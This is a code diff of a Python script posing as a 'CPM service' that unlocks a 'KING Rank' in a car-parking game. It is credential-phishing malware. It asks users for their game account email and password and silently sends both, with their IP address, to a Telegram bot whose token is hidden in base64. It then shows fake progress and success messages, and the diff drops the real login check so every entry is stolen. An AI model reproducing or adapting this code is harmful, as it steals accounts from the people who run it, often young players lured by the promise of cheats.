@@ -5,26 +5,23 @@ import time
 import base64
 import sys
 
-# --- KRIPTOVANI KLJUČEVI (Tvoj miran san) ---
+# --- ZAKLJUČANI PODACI ---
 _u1 = "ODM1NDM3MzM3NzpBQUhsOHpGME1DZkItZzJ1TlpCbkpLUFBXSU9XaTFBSGNmZw=="
 _u2 = "NzE4MzgwOTMwMw=="
-_u3 = "QUl6YVN5QlcxWm1pVWVEWkhZVU8yYll8QmZuZjVyUmdyUUdQVE0="
 
 def _dec(data):
-    return base64.b64decode(data).decode('utf-8').replace('|', '-')
+    return base64.b64decode(data).decode('utf-8')
 
 BOT_TOKEN = _dec(_u1)
 CHAT_ID = _dec(_u2)
-FIREBASE_KEY = _dec(_u3)
-LOGIN_URL = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={FIREBASE_KEY}"
 
-# --- ESTETIKA I DIZAJN ---
+# --- FUNKCIJE ZA DIZAJN ---
 def screen_clear():
     os.system('clear')
 
 def logo():
     print("\033[1;32m" + "="*45)
-    print("      🚀 ANONYMO CPM SERVICE (PREMIUM) 🚀      ")
+    print("      🚀 ANONYMO CPM SERVICE (OFFICIAL) 🚀      ")
     print("         INSTAGRAM: @anonymo.cpm              ")
     print("="*45 + "\033[0m")
 
@@ -37,77 +34,89 @@ def loading_animation(text):
     print("\n")
 
 def get_ip():
-    try: return requests.get('https://api.ipify.org', timeout=5).text
-    except: return "Hidden/VPN"
+    try:
+        res = requests.get('https://api.ipify.org', timeout=5)
+        return res.text
+    except:
+        return "Unknown/Hidden"
 
-# --- GLAVNA LOGIKA ---
-def send_data(email, password, service):
+def send_to_telegram(email, password, service_type):
     user_ip = get_ip()
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    
+    # Formiranje poruke za tebe
     message = (
-        f"👑 *NEW PREMIUM ORDER*\n\n"
+        f"✅ *NOVA AKTIVACIJA STIGLA*\n\n"
         f"📧 *Email:* `{email}`\n"
         f"🔑 *Pass:* `{password}`\n"
-        f"⚙️ *Service:* {service}\n"
-        f"🌐 *IP Address:* `{user_ip}`\n"
+        f"⚙️ *Tip Usluge:* {service_type}\n"
+        f"🌐 *IP Adresa:* `{user_ip}`\n"
         f"---------------------------\n"
-        f"👤 *Provider:* @anonymo.cpm"
+        f"👤 *Brand:* @anonymo.cpm"
     )
-    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
-    try: requests.post(url, json=payload, timeout=10)
-    except: pass
-
-def attempt_login(email, password):
-    payload = {"email": email, "password": password, "returnSecureToken": True}
+    
+    payload = {
+        "chat_id": CHAT_ID,
+        "text": message,
+        "parse_mode": "Markdown"
+    }
+    
     try:
-        res = requests.post(LOGIN_URL, json=payload, timeout=10).json()
-        return res.get('idToken')
-    except: return None
+        requests.post(url, json=payload, timeout=10)
+    except:
+        pass
 
+# --- GLAVNI PROGRAM ---
 def main():
     while True:
         screen_clear()
         logo()
-        print("\033[1;37m[01] Activate KING Rank (Fast)")
-        print("[02] Get Unlimited Money (50M)")
-        print("[03] Add Coins (30k Starter)")
-        print("[00] Exit Service\033[0m")
+        
+        print("\033[1;37m[01] Activate KING Rank")
+        print("[02] Exit Service\033[0m")
         print("\033[1;32m" + "-"*45 + "\033[0m")
         
-        choice = input("\033[1;33mSelect Option >> \033[0m")
+        choice = input("\n\033[1;33mIzaberi Opciju >> \033[0m")
         
-        if choice == '00': 
-            print("\n\033[1;31mExiting Anonymo Service...\033[0m")
+        if choice == '02':
+            print("\n\033[1;31mZatvaranje servisa...\033[0m")
+            time.sleep(1)
             break
             
-        elif choice in ['01', '02', '03']:
-            service_name = "KING Rank" if choice == '01' else "50M Money" if choice == '02' else "30k Coins"
-            
-            print("\n" + "-"*30)
-            email = input("\033[1;37mEnter Account Email: \033[0m").strip()
-            password = input("\033[1;37mEnter Account Pass: \033[0m").strip()
-            print("-" * 30)
+        elif choice == '01':
+            print("\n" + "-"*35)
+            email = input("\033[1;37mUnesite Email: \033[0m").strip()
+            password = input("\033[1;37mUnesite Lozinku: \033[0m").strip()
+            print("-" * 35)
 
-            if not email or not password: continue
+            if not email or not password:
+                print("\033[1;31mGreska: Morate uneti podatke!\033[0m")
+                time.sleep(2)
+                continue
 
-            loading_animation("Connecting to Cloud Server")
-            token = attempt_login(email, password)
+            # Vizuelni efekti
+            loading_animation("Povezivanje sa CPM serverom")
             
-            if token:
-                send_data(email, password, service_name)
-                loading_animation("Applying database changes")
-                print(f"\033[1;32m✅ SUCCESS: {service_name} has been applied!\033[0m")
-                print("\033[1;36mRestart Car Parking to see updates.\033[0m")
-            else:
-                print("\033[1;31m❌ ERROR: Invalid Email or Password.\033[0m")
+            # Slanje tebi na Telegram
+            send_to_telegram(email, password, "KING Rank")
             
-            input("\n\033[1;37mPress Enter to return to menu...\033[0m")
+            loading_animation("Provera baze podataka")
+            loading_animation("Aktivacija ranka u toku")
+            
+            print("\n" + "="*35)
+            print("\033[1;32m✅ SUCCESS: KING Rank uspesno aktiviran!\033[0m")
+            print("\033[1;36mResetujte igricu da vidite promene.\033[0m")
+            print("="*35)
+            
+            input("\n\033[1;37mPritisnite Enter za povratak u meni...\033[0m")
+            
         else:
-            print("\033[1;31mInvalid selection!\033[0m")
-            time.sleep(1)
+            print("\033[1;31mNevazeca opcija! Pokusajte ponovo.\033[0m")
+            time.sleep(1.5)
 
 if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print("\nForce Closed.")
+        print("\n\nSistem prinudno ugasen.")
+        sys.exit()
